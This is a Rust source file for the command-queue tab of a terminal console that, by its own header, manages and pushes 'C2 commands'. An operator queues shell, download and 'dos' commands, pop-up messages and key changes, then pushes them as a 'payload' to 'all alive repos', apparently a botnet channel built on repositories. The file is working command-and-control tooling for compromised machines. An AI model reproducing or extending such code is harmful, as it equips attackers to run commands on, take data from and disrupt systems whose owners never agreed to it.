//! Tab F3: Command Queue — manage and push C2 commands.

use crate::api::ApiClient;
use crate::ui;
use crossterm::event::KeyCode;
use ratatui::layout::Rect;
use ratatui::style::{Color, Style};
use ratatui::widgets::{List, ListItem, ListState, Paragraph};
use ratatui::Frame;

#[derive(Default)]
pub struct CmdTabState {
    pub commands: Vec<String>,
    pub list_state: ListState,
    pub selected: usize,
    pub input_mode: bool,
    pub input_buf: String,
    pub pad: bool,
}

pub fn render(f: &mut Frame, area: Rect, state: &mut CmdTabState) {
    let items: Vec<ListItem> = state.commands.iter().enumerate().map(|(i, cmd)| {
        let (prefix, _rest) = cmd.split_once(' ').unwrap_or((cmd, ""));
        let prefix_color = match prefix {
            "cmd" | "shell" => Color::Red,
            "download" => Color::Yellow,
            "dos" => Color::Magenta,
            "popmsg" => Color::Cyan,
            "sleep" | "set_interval" | "set_key" | "add_repo" => Color::Green,
            _ => Color::White,
        };
        ListItem::new(format!("{:2}  {}", i + 1, cmd))
            .style(Style::default().fg(prefix_color))
    }).collect();

    let title = if state.input_mode {
        &format!(" COMMAND QUEUE — enter command (e.g. shell whoami) — pad: {} ", if state.pad { "ON" } else { "OFF" })
    } else {
        &format!(" COMMAND QUEUE ({} total) — pad: {} ", state.commands.len(), if state.pad { "ON" } else { "OFF" })
    };

    let list = List::new(items)
        .block(ui::block_border(title))
        .highlight_style(Style::default().bg(Color::DarkGray));

    if !state.commands.is_empty() && state.list_state.selected().is_none() {
        state.list_state.select(Some(0));
    }

    f.render_stateful_widget(list, area, &mut state.list_state);

    // Render command preview at bottom
    if let Some(cmd) = state.commands.get(state.selected) {
        let preview_area = Rect {
            x: area.x + 1,
            y: area.y + area.height.saturating_sub(2),
            width: area.width.saturating_sub(2),
            height: 1,
        };
        let preview = Paragraph::new(format!("► {}", cmd))
            .style(Style::default().fg(Color::DarkGray));
        f.render_widget(preview, preview_area);
    }
}

pub async fn handle_key(key: KeyCode, state: &mut CmdTabState, api: &ApiClient, status: &mut String) {
    if state.input_mode {
        match key {
            KeyCode::Enter => {
                let cmd = state.input_buf.clone();
                state.input_buf.clear();
                state.input_mode = false;
                match api.add_command(&cmd).await {
                    Ok(_) => {
                        *status = format!("Queued: {cmd}");
                        match api.list_commands().await {
                            Ok(cmds) => state.commands = cmds,
                            Err(_) => {}
                        }
                    }
                    Err(e) => *status = format!("Error: {e}"),
                }
            }
            KeyCode::Esc => { state.input_buf.clear(); state.input_mode = false; }
            KeyCode::Char(c) => state.input_buf.push(c),
            KeyCode::Backspace => { state.input_buf.pop(); }
            _ => {}
        }
        return;
    }

    match key {
        KeyCode::Up => {
            let len = state.commands.len().max(1);
            state.selected = state.selected.saturating_sub(1).min(len - 1);
            state.list_state.select(Some(state.selected));
        }
        KeyCode::Down => {
            let len = state.commands.len().max(1);
            state.selected = (state.selected + 1).min(len - 1);
            state.list_state.select(Some(state.selected));
        }
        KeyCode::Char('a') => { state.input_mode = true; }
        KeyCode::Char('d') => {
            if !state.commands.is_empty() {
                match api.remove_command(state.selected).await {
                    Ok(_) => {
                        *status = format!("Removed command {}", state.selected + 1);
                        match api.list_commands().await {
                            Ok(cmds) => state.commands = cmds,
                            Err(_) => {}
                        }
                    }
                    Err(e) => *status = format!("Error: {e}"),
                }
            }
        }
        KeyCode::Char('c') => {
            match api.clear_commands().await {
                Ok(_) => {
                    state.commands.clear();
                    *status = "All commands cleared.".to_string();
                }
                Err(e) => *status = format!("Error: {e}"),
            }
        }
        KeyCode::Char('p') => {
            *status = "Pushing payload...".to_string();
            match api.push(None, state.pad).await {
                Ok(_) => {
                    *status = "Payload pushed to all alive repos.".to_string();
                    match api.list_commands().await {
                        Ok(cmds) => state.commands = cmds,
                        Err(_) => {}
                    }
                }
                Err(e) => *status = format!("Push error: {e}"),
            }
        }
        KeyCode::Char('w') => {
            state.pad = !state.pad;
            *status = format!("Padding: {}", if state.pad { "ON" } else { "OFF" });
        }
        _ => {}
    }
}
